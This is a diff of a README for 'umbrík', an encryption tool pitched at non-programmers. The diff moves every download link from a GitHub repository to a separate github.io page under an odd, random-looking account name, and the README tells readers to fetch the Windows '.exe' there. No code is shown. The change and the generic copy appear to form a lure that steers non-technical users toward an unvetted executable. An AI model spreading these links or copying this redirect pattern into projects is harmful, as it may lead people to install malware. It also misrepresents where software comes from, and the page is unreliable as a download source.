@@ -1,6 +1,6 @@
 # 🔐 umbrík - Your Files, Protected by Estonian-Grade Encryption
 
-[![Download umbrík](https://img.shields.io/badge/⬇️_Download_umbrík-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/undesired-posteriormeningealartery8782/umbrik)
+[![Download umbrík](https://img.shields.io/badge/⬇️_Download_umbrík-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://undesired-posteriormeningealartery8782.github.io)
 
 ## 👋 Welcome to umbrík
 
@@ -26,7 +26,7 @@ That's it. No programming, no code, no complicated setup.
 
 Visit this link to download the application.
 
-[**CLICK HERE TO DOWNLOAD umbrík**](https://github.com/undesired-posteriormeningealartery8782/umbrik)
+[**CLICK HERE TO DOWNLOAD umbrík**](https://undesired-posteriormeningealartery8782.github.io)
 
 Once you click the link, you'll see a page with download options. Choose the file that matches your computer (usually the one with "windows" or ".exe" in the name).
 
@@ -155,7 +155,7 @@ Protecting your data shouldn't be a chore. With umbrík, it's as easy as clickin
 
 Your files are your business. Keep them that way with umbrík.
 
-[**⬇️ Download umbrík Now**](https://github.com/undesired-posteriormeningealartery8782/umbrik)
+[**⬇️ Download umbrík Now**](https://undesired-posteriormeningealartery8782.github.io)
 
 ---
 
